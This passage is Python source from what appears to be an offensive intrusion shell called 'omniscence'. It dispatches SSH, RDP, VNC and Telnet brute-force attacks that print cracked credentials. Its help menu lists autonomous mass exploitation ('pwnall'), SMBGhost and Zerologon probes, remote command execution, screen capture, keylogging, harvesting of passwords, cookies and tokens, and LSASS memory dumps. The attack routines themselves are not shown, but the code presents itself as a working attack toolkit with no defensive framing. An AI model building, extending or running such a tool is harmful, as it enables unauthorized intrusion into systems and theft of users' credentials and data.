                print(f"{Fore.RED}[!] SSH brute force failed.")

        elif cmd == "rdp-brute":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Performing RDP brute force on {target_ip}...")
            res = await asyncio.to_thread(self.control.rdp_brute_force, target_ip)
            if res:
                for c in res: print(f"  [+] HIT: {c.get('user')}:{c.get('pwd')}")
            else:
                print(f"{Fore.RED}[!] RDP brute force failed.")

        elif cmd == "vnc-brute":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Performing VNC brute force on {target_ip}...")
            res = await asyncio.to_thread(self.control.vnc_brute_force, target_ip)
            if res:
                for c in res: print(f"  [+] HIT: {c.get('password')}")
            else:
                print(f"{Fore.RED}[!] VNC brute force failed.")

        elif cmd == "telnet-brute":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Performing Telnet brute force on {target_ip}...")
            res = await asyncio.to_thread(self.control.telnet_brute_force, target_ip)
            if res:
                for c in res: print(f"  [+] HIT: {c.get('user')}:{c.get('pwd')}")
            else:
                print(f"{Fore.RED}[!] Telnet brute force failed.")

        # --- UTILITY ---
        elif cmd == "setcreds":
            if len(args) < 2: return
            self.creds['user'], self.creds['pass'] = args[0], args[1]
            if len(args) > 2: self.creds['domain'] = args[2]
            print(f"{Fore.GREEN}[+] Credentials updated for sessions.")

        elif cmd == "select":
            if not args: return
            try:
                idx = int(args[0])
                self.last_target = self.targets[idx].ip
                print(f"{Fore.GREEN}[+] Current target set to: {self.last_target}")
            except: print(f"{Fore.RED}[!] Invalid index.")

        elif cmd == "help":
            self.show_help()
            
        else:
            print(f"{Fore.RED}[?] Unknown command: {cmd}")

    async def run_module(self, mod_id: str, function: str, args: list):
        """Production module runner."""
        print(f"{Fore.BLUE}[M] Executing module {mod_id}.{function}({args})")
        # Real module execution via dynamic dispatch
        if mod_id == '1' and function == 'auto_scan':
            self.targets = await self.scanner.auto_scan()
        print(f"{Fore.GREEN}[+] Module complete")

    def list_targets(self):
        if not self.targets:
            print(f"{Fore.YELLOW}[!] No targets discovered yet. Run 'globalscan'.")
        else:
            print(f"\n{Fore.CYAN}DISCOVERED TARGETS:")
            print(f"{Fore.CYAN}{'='*60}")
            for idx, t in enumerate(self.targets):
                ip = getattr(t, 'ip', str(t))
                os_type = getattr(t, 'os', 'Unknown OS')
                status = "COMPROMISED" if getattr(t, 'is_compromised', False) else "ACTIVE"
                print(f"  [{idx}] {ip:<15} | {os_type:<15} | {status}")

    def show_help(self):
        print(f"\n{Fore.WHITE}{Style.BRIGHT}COMMAND CENTER - OPERATIONS MANUAL")
        print(f"{Fore.LIGHTBLACK_EX}{'='*80}")
        print(f"{Fore.CYAN}RECONNAISSANCE:")
        print("  globalscan            - Autonomous discovery of all subnets and mobile hotspots")
        print("  scan <cidr>           - Standard network scan")
        print("  traceroute <ip>       - Path mapping with service fingerprinting")
        print("  vpn                   - Detect gateway VPN endpoints")
        print("  targets               - List discovered assets")
        print("  select <idx>          - Set current operational target")
        
        print(f"\n{Fore.RED}EXPLOITATION:")
        print("  attack / pwnall       - Launch global autonomous exploitation sequence")
        print("  pwn <ip>              - Targeted unauthenticated access attempt")
        print("  smbghost / zerologon  - Specific CVE vulnerability probes")
        
        print(f"\n{Fore.MAGENTA}REMOTE CONTROL & DATA:")
        print("  exec <cmd>            - Execute command via WMI/SSH (uses current target)")
        print("  screen                - Capture live remote desktop")
        print("  keylog                - Start background keystroke interceptor")
        print("  harvest               - Deep extraction of passwords, cookies, and tokens")
        print("  lsass-dump            - Perform remote memory dump for hash recovery")
        print("  sniff / creds         - Passive network traffic credential harvesting")
        print(f"{Fore.LIGHTBLACK_EX}{'='*80}\n")

async def main_loop():
    shell = OmniShell()
    shell.display_banner()
    while True:
        try:
            cmd = input(f"{Fore.CYAN}omniscence> {Style.RESET_ALL}")
            await shell.handle_command(cmd)
        except KeyboardInterrupt:
            print("\nUse 'exit' to quit.")
        except Exception as e:
            print(f"{Fore.RED}Error: {e}")

if __name__ == "__main__":
    asyncio.run(main_loop())